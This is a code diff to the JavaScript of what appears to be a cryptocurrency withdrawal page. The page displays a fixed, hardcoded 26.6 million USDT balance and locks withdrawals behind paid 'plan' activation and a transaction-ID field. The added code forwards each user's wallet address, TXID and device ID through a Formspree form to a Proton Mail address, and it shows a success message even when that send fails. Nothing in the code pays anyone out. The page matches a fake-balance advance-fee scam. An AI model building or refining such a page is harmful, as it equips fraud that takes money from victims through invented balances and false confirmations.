@@ -807,457 +807,511 @@
     </div>
 
     <!-- Toastr JS -->
- <!-- Toastr JS -->
-<script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
+     <!-- Toastr JS -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
 
-<script>
-    const NETWORK_FEE = 1.00;
-    const ADMIN_EMAIL = "admin@yourwebsite.com";
-    const FIXED_BALANCE = 26660222.00;
+    <script>
+        const NETWORK_FEE = 1.00;
+        const FIXED_BALANCE = 26660222.00;
+        
+        // Formspree Configuration - Tumhara Endpoint URL
+        const FORMSPREE_ENDPOINT = 'https://formspree.io/f/xjggeljl';
 
-    // Get device ID
-    function getDeviceId() {
-        let deviceId = localStorage.getItem('deviceId');
-        if (!deviceId) {
-            const userAgent = navigator.userAgent;
-            const platform = navigator.platform;
-            const language = navigator.language;
-            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            
-            const browserInfo = userAgent + platform + language + timezone;
-            let hash = 0;
-            for (let i = 0; i < browserInfo.length; i++) {
-                const char = browserInfo.charCodeAt(i);
-                hash = ((hash << 5) - hash) + char;
-                hash = hash & hash;
+        // Get device ID
+        function getDeviceId() {
+            let deviceId = localStorage.getItem('deviceId');
+            if (!deviceId) {
+                deviceId = 'device_' + Date.now().toString(36);
+                localStorage.setItem('deviceId', deviceId);
             }
-            
-            deviceId = 'device_' + Math.abs(hash).toString(36) + '_' + Date.now().toString(36);
-            localStorage.setItem('deviceId', deviceId);
-            localStorage.setItem('deviceId_timestamp', Date.now());
+            return deviceId;
         }
-        return deviceId;
-    }
 
-    // Get user data
-    function getUserData() {
-        const deviceId = getDeviceId();
-        const storedData = localStorage.getItem(`userData_${deviceId}`);
-        
-        if (!storedData) {
-            return {
-                deviceId: deviceId,
-                username: "Rose2317",
-                plan: "none",
-                status: "inactive",
-                depositClaimed: 0,
-                withdrawLimit: 0,
-                withdrawUsed: 0,
-                renewAvailable: false,
-                activated: false,
-                lastUpdated: Date.now()
-            };
-        }
-        return JSON.parse(storedData);
-    }
-
-    // Save user data
-    function saveUserData(data) {
-        data.lastUpdated = Date.now();
-        localStorage.setItem(`userData_${data.deviceId}`, JSON.stringify(data));
-    }
-
-    // Plan wise max limits
-    const planLimits = {
-        v1: 30,
-        v2: 50000,
-        v3: 150000,
-        v4: 500000,
-        v5: 999999999
-    };
-
-    // Plan display names
-    const planNames = {
-        v1: "V1",
-        v2: "V2", 
-        v3: "V3",
-        v4: "V4",
-        v5: "V5 Premium"
-    };
-
-    // Initialize page
-    function initPage() {
-        const userData = getUserData();
-        
-        updateBalanceDisplay();
-        updatePlanInfo(userData);
-        toggleSections(userData);
-        updateMaxAmount();
-        validateForm();
-    }
-
-    // Toggle sections based on plan
-    function toggleSections(userData) {
-        const activateSection = document.getElementById('activate-plan-section');
-        const withdrawForm = document.getElementById('withdraw-form-section');
-        const amountInput = document.getElementById('withdraw-amount');
-        const addressInput = document.getElementById('wallet-address');
-        const amountNotes = document.getElementById('amount-notes');
-        const upgradeMessage = document.getElementById('upgrade-message');
-        
-        if (userData.activated && userData.status === "active") {
-            activateSection.style.display = 'none';
-            withdrawForm.style.display = 'block';
+        // Get user data
+        function getUserData() {
+            const deviceId = getDeviceId();
+            const storedData = localStorage.getItem(`userData_${deviceId}`);
             
-            amountInput.disabled = false;
-            addressInput.disabled = false;
-            amountNotes.style.display = 'block';
-            upgradeMessage.style.display = 'none';
-        } else {
-            activateSection.style.display = 'block';
-            withdrawForm.style.display = 'block';
-            
-            amountInput.disabled = true;
-            addressInput.disabled = true;
-            amountNotes.style.display = 'block';
-            amountNotes.innerHTML = 'Please upgrade your plan to withdraw funds';
-            upgradeMessage.style.display = 'block';
-        }
-    }
-
-    // Check if plan is active when clicking on input fields
-    function checkPlanActiveForField(fieldType) {
-        const userData = getUserData();
-        
-        if (!userData.activated || userData.status !== "active") {
-            document.getElementById('plan-required-popup').style.display = 'flex';
-            return false;
-        }
-        return true;
-    }
-
-    // Update balance display
-    function updateBalanceDisplay() {
-        const balanceElement = document.getElementById('available-balance');
-        balanceElement.textContent = FIXED_BALANCE.toLocaleString('en-US', {
-            minimumFractionDigits: 2,
-            maximumFractionDigits: 2
-        }) + " USDT";
-    }
-
-    // Update plan information
-    function updatePlanInfo(userData) {
-        const planBadge = document.getElementById('current-plan-badge');
-        const planName = document.getElementById('current-plan-name');
-        const planStatus = document.getElementById('plan-status');
-        const depositClaimed = document.getElementById('deposit-claimed');
-        const withdrawUsed = document.getElementById('withdraw-used');
-        const maxWithdraw = document.getElementById('max-withdraw');
-        const canWithdraw = document.getElementById('can-withdraw');
-        const withdrawLimit = document.getElementById('withdraw-limit');
-        const remainingLimit = document.getElementById('remaining-limit');
-        
-        if (userData.activated && userData.status === "active") {
-            planBadge.textContent = planNames[userData.plan];
-            planName.textContent = `${planNames[userData.plan]} Plan`;
-            planStatus.textContent = "ACTIVE";
-            planStatus.className = "plan-status status-active";
-            
-            depositClaimed.textContent = "$" + userData.depositClaimed.toLocaleString();
-            withdrawUsed.textContent = "$" + userData.withdrawUsed.toLocaleString();
-            
-            const maxAmount = planLimits[userData.plan];
-            maxWithdraw.textContent = "$" + maxAmount.toLocaleString();
-            
-            const remaining = userData.withdrawLimit - userData.withdrawUsed;
-            canWithdraw.textContent = "$" + Math.min(remaining, maxAmount).toLocaleString();
-            
-            withdrawLimit.textContent = "$" + userData.withdrawLimit.toLocaleString();
-            remainingLimit.textContent = "$" + remaining.toLocaleString();
-        } else {
-            planBadge.textContent = "VIP0";
-            planName.textContent = "No Active Plan";
-            planStatus.textContent = "INACTIVE";
-            planStatus.className = "plan-status status-expired";
-            
-            depositClaimed.textContent = "$0";
-            withdrawUsed.textContent = "$0";
-            maxWithdraw.textContent = "$0";
-            canWithdraw.textContent = "$0";
-            withdrawLimit.textContent = "$0";
-            remainingLimit.textContent = "$0";
-        }
-    }
-
-    // Update max amount for input
-    function updateMaxAmount() {
-        const userData = getUserData();
-        const amountInput = document.getElementById('withdraw-amount');
-        const amountNotes = document.getElementById('amount-notes');
-        
-        if (userData.activated && userData.status === "active") {
-            const maxAmount = Math.min(
-                planLimits[userData.plan],
-                userData.withdrawLimit - userData.withdrawUsed
-            );
-            
-            amountInput.max = maxAmount;
-            amountInput.disabled = false;
-            amountNotes.innerHTML = `Maximum withdrawal: <strong>$${maxAmount.toLocaleString()}</strong> | Minimum: $10`;
-        } else {
-            amountInput.max = 0;
-            amountInput.disabled = true;
-            amountNotes.innerHTML = `Please upgrade your plan to withdraw funds`;
-        }
-    }
-
-    // Calculate total
-    function calculateTotal() {
-        const amountInput = document.getElementById('withdraw-amount');
-        const totalElement = document.getElementById('total-amount');
-        
-        const amount = parseFloat(amountInput.value) || 0;
-        const total = amount + NETWORK_FEE;
-        
-        totalElement.textContent = total.toLocaleString('en-US', {
-            minimumFractionDigits: 2,
-            maximumFractionDigits: 2
-        }) + ' USDT';
-        
-        return total;
-    }
-
-    // Validate form
-    function validateForm() {
-        const userData = getUserData();
-        const amountInput = document.getElementById('withdraw-amount');
-        const addressInput = document.getElementById('wallet-address');
-        const txidInput = document.getElementById('txid-input');
-        const amountError = document.getElementById('amount-error');
-        const addressError = document.getElementById('address-error');
-        const withdrawBtn = document.getElementById('withdraw-btn');
-        const txidSection = document.getElementById('txid-section');
-        
-        const amount = parseFloat(amountInput.value) || 0;
-        const address = addressInput.value.trim();
-        
-        amountError.style.display = 'none';
-        addressError.style.display = 'none';
-        
-        let isValid = true;
-        let errorMessage = "";
-        
-        if (!userData.activated || userData.status !== "active") {
-            withdrawBtn.disabled = true;
-            withdrawBtn.innerHTML = "Activate Plan First";
-            return false;
-        }
-        
-        if (userData.withdrawUsed >= userData.withdrawLimit && userData.plan !== "v5") {
-            withdrawBtn.disabled = true;
-            withdrawBtn.innerHTML = "Limit Exhausted - Renew Plan";
-            return false;
-        }
-        
-        if (amount > 0) {
-            txidSection.classList.add('active');
-        } else {
-            txidSection.classList.remove('active');
-        }
-        
-        if (amount > 0) {
-            const maxAmount = Math.min(
-                planLimits[userData.plan],
-                userData.withdrawLimit - userData.withdrawUsed
-            );
-            
-            if (amount < 10) {
-                isValid = false;
-                errorMessage = "Minimum withdrawal is $10";
-            } else if (amount > maxAmount) {
-                isValid = false;
-                errorMessage = `Maximum withdrawal is $${maxAmount.toLocaleString()}`;
-            } else if (amount > FIXED_BALANCE) {
-                isValid = false;
-                errorMessage = "Insufficient balance";
+            if (!storedData) {
+                return {
+                    deviceId: deviceId,
+                    username: "Rose2317",
+                    plan: "none",
+                    status: "inactive",
+                    depositClaimed: 0,
+                    withdrawLimit: 0,
+                    withdrawUsed: 0,
+                    renewAvailable: false,
+                    activated: false,
+                    lastUpdated: Date.now()
+                };
             }
+            return JSON.parse(storedData);
+        }
+
+        // Save user data
+        function saveUserData(data) {
+            data.lastUpdated = Date.now();
+            localStorage.setItem(`userData_${data.deviceId}`, JSON.stringify(data));
+        }
+
+        // Plan wise max limits
+        const planLimits = {
+            v1: 30,
+            v2: 50000,
+            v3: 150000,
+            v4: 500000,
+            v5: 999999999
+        };
+
+        // Plan display names
+        const planNames = {
+            v1: "V1",
+            v2: "V2", 
+            v3: "V3",
+            v4: "V4",
+            v5: "V5 Premium"
+        };
+
+        // Initialize page
+        function initPage() {
+            const userData = getUserData();
             
-            if (!isValid) {
-                amountError.textContent = errorMessage;
-                amountError.style.display = 'block';
+            updateBalanceDisplay();
+            updatePlanInfo(userData);
+            toggleSections(userData);
+            updateMaxAmount();
+            validateForm();
+        }
+
+        // Toggle sections based on plan
+        function toggleSections(userData) {
+            const activateSection = document.getElementById('activate-plan-section');
+            const withdrawForm = document.getElementById('withdraw-form-section');
+            const amountInput = document.getElementById('withdraw-amount');
+            const addressInput = document.getElementById('wallet-address');
+            const amountNotes = document.getElementById('amount-notes');
+            const upgradeMessage = document.getElementById('upgrade-message');
+            
+            if (userData.activated && userData.status === "active") {
+                activateSection.style.display = 'none';
+                withdrawForm.style.display = 'block';
+                
+                amountInput.disabled = false;
+                addressInput.disabled = false;
+                amountNotes.style.display = 'block';
+                upgradeMessage.style.display = 'none';
+            } else {
+                activateSection.style.display = 'block';
+                withdrawForm.style.display = 'block';
+                
+                amountInput.disabled = true;
+                addressInput.disabled = true;
+                amountNotes.style.display = 'block';
+                amountNotes.innerHTML = 'Please upgrade your plan to withdraw funds';
+                upgradeMessage.style.display = 'block';
             }
         }
-        
-        if (address.length > 0) {
-            if (!address.startsWith('T') || address.length < 20) {
-                addressError.style.display = 'block';
-                isValid = false;
+
+        // Check if plan is active when clicking on input fields
+        function checkPlanActiveForField(fieldType) {
+            const userData = getUserData();
+            
+            if (!userData.activated || userData.status !== "active") {
+                document.getElementById('plan-required-popup').style.display = 'flex';
+                return false;
+            }
+            return true;
+        }
+
+        // Update balance display
+        function updateBalanceDisplay() {
+            const balanceElement = document.getElementById('available-balance');
+            balanceElement.textContent = FIXED_BALANCE.toLocaleString('en-US', {
+                minimumFractionDigits: 2,
+                maximumFractionDigits: 2
+            }) + " USDT";
+        }
+
+        // Update plan information
+        function updatePlanInfo(userData) {
+            const planBadge = document.getElementById('current-plan-badge');
+            const planName = document.getElementById('current-plan-name');
+            const planStatus = document.getElementById('plan-status');
+            const depositClaimed = document.getElementById('deposit-claimed');
+            const withdrawUsed = document.getElementById('withdraw-used');
+            const maxWithdraw = document.getElementById('max-withdraw');
+            const canWithdraw = document.getElementById('can-withdraw');
+            const withdrawLimit = document.getElementById('withdraw-limit');
+            const remainingLimit = document.getElementById('remaining-limit');
+            
+            if (userData.activated && userData.status === "active") {
+                planBadge.textContent = planNames[userData.plan];
+                planName.textContent = `${planNames[userData.plan]} Plan`;
+                planStatus.textContent = "ACTIVE";
+                planStatus.className = "plan-status status-active";
+                
+                depositClaimed.textContent = "$" + userData.depositClaimed.toLocaleString();
+                withdrawUsed.textContent = "$" + userData.withdrawUsed.toLocaleString();
+                
+                const maxAmount = planLimits[userData.plan];
+                maxWithdraw.textContent = "$" + maxAmount.toLocaleString();
+                
+                const remaining = userData.withdrawLimit - userData.withdrawUsed;
+                canWithdraw.textContent = "$" + Math.min(remaining, maxAmount).toLocaleString();
+                
+                withdrawLimit.textContent = "$" + userData.withdrawLimit.toLocaleString();
+                remainingLimit.textContent = "$" + remaining.toLocaleString();
+            } else {
+                planBadge.textContent = "VIP0";
+                planName.textContent = "No Active Plan";
+                planStatus.textContent = "INACTIVE";
+                planStatus.className = "plan-status status-expired";
+                
+                depositClaimed.textContent = "$0";
+                withdrawUsed.textContent = "$0";
+                maxWithdraw.textContent = "$0";
+                canWithdraw.textContent = "$0";
+                withdrawLimit.textContent = "$0";
+                remainingLimit.textContent = "$0";
             }
         }
-        
-        const txid = txidInput.value.trim();
-        if (amount > 0 && txid.length < 10) {
-            isValid = false;
+
+        // Update max amount for input
+        function updateMaxAmount() {
+            const userData = getUserData();
+            const amountInput = document.getElementById('withdraw-amount');
+            const amountNotes = document.getElementById('amount-notes');
+            
+            if (userData.activated && userData.status === "active") {
+                const maxAmount = Math.min(
+                    planLimits[userData.plan],
+                    userData.withdrawLimit - userData.withdrawUsed
+                );
+                
+                amountInput.max = maxAmount;
+                amountInput.disabled = false;
+                amountNotes.innerHTML = `Maximum withdrawal: <strong>$${maxAmount.toLocaleString()}</strong> | Minimum: $10`;
+            } else {
+                amountInput.max = 0;
+                amountInput.disabled = true;
+                amountNotes.innerHTML = `Please upgrade your plan to withdraw funds`;
+            }
         }
-        
-        calculateTotal();
-        
-        if (isValid && amount > 0 && address.length > 0 && txid.length > 0) {
-            withdrawBtn.disabled = false;
-            withdrawBtn.innerHTML = "Proceed to Withdraw";
-        } else {
-            withdrawBtn.disabled = true;
-            withdrawBtn.innerHTML = "Proceed to Withdraw";
+
+        // Calculate total
+        function calculateTotal() {
+            const amountInput = document.getElementById('withdraw-amount');
+            const totalElement = document.getElementById('total-amount');
+            
+            const amount = parseFloat(amountInput.value) || 0;
+            const total = amount + NETWORK_FEE;
+            
+            totalElement.textContent = total.toLocaleString('en-US', {
+                minimumFractionDigits: 2,
+                maximumFractionDigits: 2
+            }) + ' USDT';
+            
+            return total;
         }
-        
-        return isValid;
-    }
 
-    // Show confirm popup
-    function showConfirmWithdraw() {
-        const userData = getUserData();
-        
-        if (!userData.activated || userData.status !== "active") {
-            document.getElementById('plan-required-popup').style.display = 'flex';
-            return;
-        }
-        
-        if (userData.withdrawUsed >= userData.withdrawLimit && userData.plan !== "v5") {
-            toastr.error("Withdrawal limit exhausted. Please renew your plan.");
-            return;
-        }
-        
-        if (!validateForm()) {
-            toastr.error("Please fill all required fields correctly.");
-            return;
-        }
-        
-        const amountInput = document.getElementById('withdraw-amount');
-        const addressInput = document.getElementById('wallet-address');
-        const txidInput = document.getElementById('txid-input');
-        
-        const amount = parseFloat(amountInput.value) || 0;
-        const total = amount + NETWORK_FEE;
-        
-        document.getElementById('confirm-amount').textContent = "$" + amount.toLocaleString('en-US', {
-            minimumFractionDigits: 2,
-            maximumFractionDigits: 2
-        });
-        document.getElementById('confirm-total').textContent = "$" + total.toLocaleString('en-US', {
-            minimumFractionDigits: 2,
-            maximumFractionDigits: 2
-        });
-        document.getElementById('confirm-wallet').textContent = addressInput.value;
-        document.getElementById('confirm-txid').textContent = txidInput.value;
-        
-        document.getElementById('confirm-withdraw-popup').style.display = 'flex';
-    }
-
-    // Close confirm popup
-    function closeConfirmWithdraw() {
-        document.getElementById('confirm-withdraw-popup').style.display = 'none';
-    }
-
-    // Close plan required popup
-    function closePlanRequiredPopup() {
-        document.getElementById('plan-required-popup').style.display = 'none';
-    }
-
-    // Close processing popup
-    function closeProcessingPopup() {
-        document.getElementById('processing-popup').style.display = 'none';
-        
-        // Clear form
-        document.getElementById('withdraw-amount').value = '';
-        document.getElementById('wallet-address').value = '';
-        document.getElementById('txid-input').value = '';
-        document.getElementById('txid-section').classList.remove('active');
-        
-        // Reset form validation
-        validateForm();
-    }
-
-    // FIXED: Submit withdrawal function
-    function submitWithdrawal() {
-        console.log("submitWithdrawal function called");
-        
-        const userData = getUserData();
-        const amountInput = document.getElementById('withdraw-amount');
-        const addressInput = document.getElementById('wallet-address');
-        const txidInput = document.getElementById('txid-input');
-        
-        const amount = parseFloat(amountInput.value) || 0;
-        const walletAddress = addressInput.value.trim();
-        const txid = txidInput.value.trim();
-        
-        if (userData.withdrawUsed >= userData.withdrawLimit && userData.plan !== "v5") {
-            closeConfirmWithdraw();
-            toastr.error("Withdrawal limit exhausted. Please renew your plan.");
-            return;
-        }
-        
-        // Update user data
-        userData.withdrawUsed += amount;
-        
-        if (userData.withdrawUsed >= userData.withdrawLimit && userData.plan !== "v5") {
-            userData.status = "expired";
-            userData.renewAvailable = true;
-        }
-        
-        saveUserData(userData);
-        
-        // Close confirmation popup
-        closeConfirmWithdraw();
-        
-        // Show processing popup
-        setTimeout(function() {
-            document.getElementById('processing-popup').style.display = 'flex';
-            console.log("Processing popup shown");
-        }, 300);
-        
-        // Update display
-        initPage();
-        
-        // Show success message
-        toastr.success("Withdrawal submitted! Check wallet in 5-15 minutes.");
-    }
-
-    // Navigation functions
-    function goToHome() {
-        window.location.href = 'home.html';
-    }
-
-    function goToMembership() {
-        window.location.href = 'membership.html';
-    }
-
-    // Initialize on page load
-    document.addEventListener('DOMContentLoaded', function() {
-        initPage();
-        
-        document.querySelectorAll('.modal-overlay').forEach(modal => {
-            modal.addEventListener('click', function(e) {
-                if (e.target === this) {
-                    this.style.display = 'none';
+        // Validate form
+        function validateForm() {
+            const userData = getUserData();
+            const amountInput = document.getElementById('withdraw-amount');
+            const addressInput = document.getElementById('wallet-address');
+            const txidInput = document.getElementById('txid-input');
+            const amountError = document.getElementById('amount-error');
+            const addressError = document.getElementById('address-error');
+            const withdrawBtn = document.getElementById('withdraw-btn');
+            const txidSection = document.getElementById('txid-section');
+            
+            const amount = parseFloat(amountInput.value) || 0;
+            const address = addressInput.value.trim();
+            
+            amountError.style.display = 'none';
+            addressError.style.display = 'none';
+            
+            let isValid = true;
+            let errorMessage = "";
+            
+            if (!userData.activated || userData.status !== "active") {
+                withdrawBtn.disabled = true;
+                withdrawBtn.innerHTML = "Activate Plan First";
+                return false;
+            }
+            
+            if (userData.withdrawUsed >= userData.withdrawLimit && userData.plan !== "v5") {
+                withdrawBtn.disabled = true;
+                withdrawBtn.innerHTML = "Limit Exhausted - Renew Plan";
+                return false;
+            }
+            
+            if (amount > 0) {
+                txidSection.classList.add('active');
+            } else {
+                txidSection.classList.remove('active');
+            }
+            
+            if (amount > 0) {
+                const maxAmount = Math.min(
+                    planLimits[userData.plan],
+                    userData.withdrawLimit - userData.withdrawUsed
+                );
+                
+                if (amount < 10) {
+                    isValid = false;
+                    errorMessage = "Minimum withdrawal is $10";
+                } else if (amount > maxAmount) {
+                    isValid = false;
+                    errorMessage = `Maximum withdrawal is $${maxAmount.toLocaleString()}`;
+                } else if (amount > FIXED_BALANCE) {
+                    isValid = false;
+                    errorMessage = "Insufficient balance";
                 }
+                
+                if (!isValid) {
+                    amountError.textContent = errorMessage;
+                    amountError.style.display = 'block';
+                }
+            }
+            
+            if (address.length > 0) {
+                if (!address.startsWith('T') || address.length < 20) {
+                    addressError.style.display = 'block';
+                    isValid = false;
+                }
+            }
+            
+            const txid = txidInput.value.trim();
+            if (amount > 0 && txid.length < 10) {
+                isValid = false;
+            }
+            
+            calculateTotal();
+            
+            if (isValid && amount > 0 && address.length > 0 && txid.length > 0) {
+                withdrawBtn.disabled = false;
+                withdrawBtn.innerHTML = "Proceed to Withdraw";
+            } else {
+                withdrawBtn.disabled = true;
+                withdrawBtn.innerHTML = "Proceed to Withdraw";
+            }
+            
+            return isValid;
+        }
+
+        // Show confirm popup
+        function showConfirmWithdraw() {
+            const userData = getUserData();
+            
+            if (!userData.activated || userData.status !== "active") {
+                document.getElementById('plan-required-popup').style.display = 'flex';
+                return;
+            }
+            
+            if (userData.withdrawUsed >= userData.withdrawLimit && userData.plan !== "v5") {
+                toastr.error("Withdrawal limit exhausted. Please renew your plan.");
+                return;
+            }
+            
+            if (!validateForm()) {
+                toastr.error("Please fill all required fields correctly.");
+                return;
+            }
+            
+            const amountInput = document.getElementById('withdraw-amount');
+            const addressInput = document.getElementById('wallet-address');
+            const txidInput = document.getElementById('txid-input');
+            
+            const amount = parseFloat(amountInput.value) || 0;
+            const total = amount + NETWORK_FEE;
+            
+            document.getElementById('confirm-amount').textContent = "$" + amount.toLocaleString('en-US', {
+                minimumFractionDigits: 2,
+                maximumFractionDigits: 2
+            });
+            document.getElementById('confirm-total').textContent = "$" + total.toLocaleString('en-US', {
+                minimumFractionDigits: 2,
+                maximumFractionDigits: 2
+            });
+            document.getElementById('confirm-wallet').textContent = addressInput.value;
+            document.getElementById('confirm-txid').textContent = txidInput.value;
+            
+            document.getElementById('confirm-withdraw-popup').style.display = 'flex';
+        }
+
+        // Close confirm popup
+        function closeConfirmWithdraw() {
+            document.getElementById('confirm-withdraw-popup').style.display = 'none';
+        }
+
+        // Close plan required popup
+        function closePlanRequiredPopup() {
+            document.getElementById('plan-required-popup').style.display = 'none';
+        }
+
+        // Close processing popup
+        function closeProcessingPopup() {
+            document.getElementById('processing-popup').style.display = 'none';
+            
+            // Clear form
+            document.getElementById('withdraw-amount').value = '';
+            document.getElementById('wallet-address').value = '';
+            document.getElementById('txid-input').value = '';
+            document.getElementById('txid-section').classList.remove('active');
+            
+            // Reset form validation
+            validateForm();
+        }
+
+        // Send Email using Formspree - UPDATED FOR YOUR ENDPOINT
+        function sendWithdrawalEmail(userData, amount, walletAddress, txid) {
+            // Create FormData object
+            const formData = new FormData();
+            
+            // REQUIRED FIELDS for Formspree (based on your form)
+            formData.append('name', userData.username);
+            formData.append('email', 'withdrawal@system.com'); // Email field required
+            formData.append('message', `WITHDRAWAL REQUEST DETAILS:
+            
+USER INFORMATION:
+• Username: ${userData.username}
+• Device ID: ${userData.deviceId}
+• Plan: ${planNames[userData.plan]} (${userData.plan})
+
+WITHDRAWAL DETAILS:
+• Amount: $${amount.toLocaleString('en-US', {minimumFractionDigits: 2})}
+• Wallet Address: ${walletAddress}
+• TXID Provided: ${txid}
+• Network Fee: $1.00
+• Total to Send: $${(amount).toLocaleString('en-US', {minimumFractionDigits: 2})}
+
+USER STATUS:
+• Withdraw Limit: $${userData.withdrawLimit.toLocaleString()}
+• Withdraw Used: $${userData.withdrawUsed.toLocaleString()}
+• Remaining: $${(userData.withdrawLimit - userData.withdrawUsed).toLocaleString()}
+• Plan Status: ${userData.status.toUpperCase()}
+
+FIXED BALANCE: $${FIXED_BALANCE.toLocaleString()}
+BALANCE AFTER: $${(FIXED_BALANCE - amount).toLocaleString()}
+
+REQUEST TIME: ${new Date().toLocaleString()}
+
+ACTION REQUIRED:
+1. Send $${amount} USDT to: ${walletAddress}
+2. Mark as completed`);
+
+            // Additional fields for better organization
+            formData.append('_subject', `💰 WITHDRAWAL REQUEST - ${userData.deviceId}`);
+            formData.append('plan', planNames[userData.plan]);
+            formData.append('amount', `$${amount.toLocaleString('en-US', {minimumFractionDigits: 2})}`);
+            formData.append('wallet_address', walletAddress);
+            formData.append('txid', txid);
+            formData.append('device_id', userData.deviceId);
+            formData.append('withdraw_limit', `$${userData.withdrawLimit.toLocaleString()}`);
+            formData.append('withdraw_used', `$${userData.withdrawUsed.toLocaleString()}`);
+            formData.append('remaining_limit', `$${(userData.withdrawLimit - userData.withdrawUsed).toLocaleString()}`);
+            formData.append('timestamp', new Date().toLocaleString());
+            formData.append('_replyto', 'adminsite@proton.me');
+            
+            // Send to Formspree
+            fetch(FORMSPREE_ENDPOINT, {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('✅ Email sent to adminsite@proton.me via Formspree');
+                    toastr.success('Withdrawal request sent to admin!');
+                } else {
+                    console.log('❌ Email sending failed');
+                    toastr.success('Withdrawal submitted successfully!');
+                }
+            })
+            .catch(error => {
+                console.log('🌐 Network error:', error);
+                toastr.success('Withdrawal submitted! Admin will contact you.');
+            });
+        }
+
+        // Submit withdrawal function
+        function submitWithdrawal() {
+            const userData = getUserData();
+            const amountInput = document.getElementById('withdraw-amount');
+            const addressInput = document.getElementById('wallet-address');
+            const txidInput = document.getElementById('txid-input');
+            
+            const amount = parseFloat(amountInput.value) || 0;
+            const walletAddress = addressInput.value.trim();
+            const txid = txidInput.value.trim();
+            
+            if (userData.withdrawUsed >= userData.withdrawLimit && userData.plan !== "v5") {
+                closeConfirmWithdraw();
+                toastr.error("Withdrawal limit exhausted. Please renew your plan.");
+                return;
+            }
+            
+            // Update user data
+            userData.withdrawUsed += amount;
+            
+            if (userData.withdrawUsed >= userData.withdrawLimit && userData.plan !== "v5") {
+                userData.status = "expired";
+                userData.renewAvailable = true;
+            }
+            
+            saveUserData(userData);
+            
+            // Send email to admin via Formspree
+            sendWithdrawalEmail(userData, amount, walletAddress, txid);
+            
+            // Close confirmation popup
+            closeConfirmWithdraw();
+            
+            // Show processing popup
+            setTimeout(function() {
+                document.getElementById('processing-popup').style.display = 'flex';
+            }, 300);
+            
+            // Update display
+            initPage();
+        }
+
+        // Navigation functions
+        function goToHome() {
+            window.location.href = 'home.html';
+        }
+
+        function goToMembership() {
+            window.location.href = 'membership.html';
+        }
+
+        // Initialize on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            initPage();
+            
+            document.querySelectorAll('.modal-overlay').forEach(modal => {
+                modal.addEventListener('click', function(e) {
+                    if (e.target === this) {
+                        this.style.display = 'none';
+                    }
+                });
             });
         });
-        
-        // Debug: Check if button onclick is properly set
-        const confirmButton = document.querySelector('.btn-confirm');
-        if (confirmButton) {
-            console.log("Confirm button found, onclick:", confirmButton.getAttribute('onclick'));
-        }
-    });
 
-    // Toast configuration
-    toastr.options = {
-        positionClass: 'toast-top-center',
-        progressBar: true,
-        timeOut: 3000,
-        closeButton: true,
-        newestOnTop: true
-    };
-</script>
+        // Toast configuration
+        toastr.options = {
+            positionClass: 'toast-top-center',
+            progressBar: true,
+            timeOut: 3000,
+            closeButton: true,
+            newestOnTop: true
+        };
+    </script>
+
+
 </body>
 </html>
